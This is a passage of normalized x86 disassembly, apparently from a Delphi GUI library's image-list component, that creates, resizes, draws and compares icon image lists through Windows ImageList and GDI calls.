call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_44b224
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_41942c
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_44b278
push ebx
push esi
push edi
call sub_40361c
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413b5c
mov edx eax
mov eax edi
call sub_44c244
mov eax [ edi + 0x50 ]
call sub_403290
mov eax edi
call sub_44b5d4
mov eax [ edi + 0x4c ]
call sub_403290
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419478
test bl bl
jle r-xdata
call sub_403290
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403604
sub_44b2e4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44b391
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44c1cc
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44b3b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b398
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_44b3b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44b451
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_4227d4
mov eax ebx
call sub_421c54
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41cf14
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412640
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_421c54
pop edx
call sub_41d2ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b458
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44b474
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_44b3b0
pop ecx
pop edx
pop ebx
retn
sub_44b4ac
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_44b39c
test al al
je r-xdata
mov eax esi
call sub_44bb6c
mov eax esi
call sub_44b3b0
mov eax esi
mov si 0xffef
call sub_40348c
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44b4f0
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_44b39c
test al al
je r-xdata
mov eax esi
call sub_44bb6c
mov eax esi
call sub_44b3b0
mov eax esi
mov si 0xffef
call sub_40348c
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44b534
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b5d4
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44b474
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_40348c
sub_44b580
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44c154
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_421cc0
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44b5d4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44b39c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_40348c
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44b570
push eax
call ImageList_Destroy
sub_44b60c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44b69f
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44b39c
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b6a6
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov edx eax
mov eax ebx
call sub_44bb78
sub_44b6ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b75b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b73e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44b3a4
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b580
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b580
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b745
mov eax [ ebp - 0x10 ]
call sub_403290
retn
sub_44b778
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b877
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b580
push eax
mov eax [ ebp - 0x4 ]
call sub_44b570
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b87e
mov eax [ ebp - 0xc ]
call sub_403290
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b839
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_422b78
mov eax [ ebp - 0x4 ]
call sub_44b3a4
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44b560
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b580
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403290
retn
sub_44b894
push ebx
mov ebx eax
mov eax ebx
call sub_44b39c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44b570
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44b8b8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44bacf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44b39c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bad6
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404004
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c154
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b778
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
xor eax eax
push ebp
push sub_44ba80
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ba60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44ba43
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_422a24
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_421c54
call sub_41d780
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44b570
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_421c54
call sub_41d780
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44b570
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_44b570
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ba4a
mov eax [ ebp - 0x10 ]
call sub_403290
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
sub_44bae0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44bb5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44b894
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44b39c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
mov eax ebx
mov si 0xffef
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bb66
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
push esi
mov eax ebx
call sub_44b570
push eax
call ImageList_Remove
sub_44bb78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b39c
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44b198
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_40348c
pop esi
pop ebx
retn
sub_44bbb0
push ebx
mov ebx eax
mov eax ebx
call sub_44b39c
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44b570
push eax
call ImageList_GetBkColor
call sub_44b1b8
pop ebx
retn
sub_44bbd8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44b39c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44b198
push eax
mov eax ebx
call sub_44bbb0
call sub_44b198
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41d780
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44b570
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_421c54
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41cf14
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_412640
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_421c54
pop edx
call sub_41d2ec
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_421c54
call sub_41d780
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44b570
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_412640
mov eax [ ebx + 0x54 ]
call sub_421c54
call sub_41d780
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41cf14
mov eax edi
call sub_41d780
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41cf14
mov eax edi
call sub_41d780
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_422a24
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_44bdac
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_44bdd0
pop ebx
pop ebp
retn 0xc
sub_44bdd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b39c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44be1c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412640
mov eax [ ebp - 0x4 ]
call sub_44cab0
xor eax eax
push ebp
push sub_44bfb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44bf98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44bf7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_422a24
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bf82
mov eax [ ebp - 0x10 ]
call sub_403290
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_421c54
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41d2ec
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41d780
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_421c54
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d2ec
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41d780
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44b6ac
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44bfc4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44b570
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_44be1c
sub_44bfe4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
call sub_44b5d4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414030
mov eax ebx
call sub_44bb6c
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44c1cc
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44b570
mov edx eax
mov eax ebx
call sub_44b474
mov eax ebx
call sub_44b39c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44b570
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44b3a4
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44b570
push eax
call ImageList_GetBkColor
call sub_44b1b8
mov edx eax
mov eax ebx
call sub_44bb78
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44bfc4
jmp r-xdata
sub_44c0a4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414114
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44c1cc
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_44bb6c
mov eax esi
call sub_44b570
mov edx eax
mov eax ebx
call sub_44b474
mov eax ebx
call sub_44b39c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44b570
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44b3a4
jmp r-xdata
mov eax esi
call sub_44b570
push eax
call ImageList_GetBkColor
call sub_44b1b8
mov edx eax
mov eax ebx
call sub_44bb78
mov edx esi
mov eax ebx
call sub_44bfc4
pop esi
pop ebx
retn
sub_44c154
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44c1c0
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c1c7
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44c1f4
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_413a74
mov si 0xffff
call sub_40348c
inc ebp
dec edi
jne r-xdata
sub_44c244
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413964
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413a74
cmp ebp eax
jne r-xdata
sub_44c29c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407c70
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44c2e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_44b894
mov ebx eax
mov eax edi
call sub_44b894
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_44b894
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44c3bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44c39f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44c29c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c3a6
mov eax [ ebp - 0xc ]
call sub_403290
retn
mov eax edi
call sub_44b894
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_44c3d0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44b894
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44c2e0
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44c42c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
